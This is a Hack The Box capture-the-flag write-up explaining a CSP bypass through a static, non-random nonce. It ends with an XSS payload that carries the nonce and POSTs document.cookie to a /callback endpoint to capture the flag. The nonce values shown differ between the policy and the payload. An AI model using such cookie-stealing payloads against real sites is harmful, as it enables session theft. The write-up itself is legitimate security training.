---
title: "Cursed Stale Policy - HTB Easy Challenge | CSP Bypass via Static Nonce"
description: "Walkthrough for Cursed Stale Policy challenge from Hack The Box. An easy web challenge where the Content Security Policy uses a non-randomized (stale) nonce, allowing an attacker to craft an XSS payload with the known nonce to bypass the CSP and exfiltrate the bot's cookies containing the flag."
author: dua2z3rr
date: 2026-06-19 1:00:00
categories:
  - HackTheBox
  - Challenges
tags: ["web"]
---

## Challenge Overview

This policy is cursed, can you bypass it?

---

## Solution

### Source Code

Although we have the source code, this challenge can be solved without it.

### Home Page

As soon as we access the challenge site, we're presented with this screen:

![cps evaluator base](assets/img/cursed_stale_policy/cps-base.png)

### What's a CSP?

CSP stands for Content Security Policy and is recognized as a browser technology whose primary goal is to defend a site against attacks such as XSS. It works by detailing the paths and sources from which resources can be safely loaded. For example, a policy might allow loading/executing resources from the same domain (`'self'`), as well as controlling inline resources and the execution of functions like `eval`.

CSPs are often implemented through response headers or by embedding meta elements in the HTML page.

### Analyzing the Challenge CSP

The challenge's CSP is:

```
default-src 'self';
script-src 'self' 'nonce-deddd421c2d4bda720fa3ad3097bb5e1';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
object-src 'none';
base-uri 'none';
report-uri /csp-report
```

- `default-src` sets a default policy for fetching resources when specific directives are absent.
- `script-src` enables specific sources for JavaScript.
- `style-src` is the same as the previous one, but for stylesheets.
- `img-src` is the same, but for images.
- `object-src` defines the sources for `<object>`, `<embed>` and `<applet>`.
- `base-uri` specifies the URLs that can be loaded using `<base>`.
- `report-uri` indicates where to send a JSON report (via POST) about a CSP violation.

We won't modify this part, since this is the CSP we have to exploit. We'll therefore need to modify the existing XSS payload.

### Exploit

In the CSP analysis above, we saw the presence of a nonce, which is often used to safely load scripts carrying that nonce. We can see it in the page's HTML source code.

```html
<script type="module" src="/static/dist/assets/main-BdnLs1Sc.js" nonce=""></script>
```

So if we insert into our payload the nonce attribute matching the one set in the CSP, the exploit will work. The real bug isn't including the nonce in the CSP, but the lack of randomization of the nonce, which is always the same.

Correct payload:

```html
<script nonce="00bca0a3a043215f83bbb3de7cef14e0">
   fetch('/callback', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookies: document.cookie })
   });
</script>
```

By clicking trigger bot, a POST request is successfully sent, and inside it we'll find the flag.

![post request with flag](assets/img/cursed_stale_policy/post.png)

**Flag obtained.**
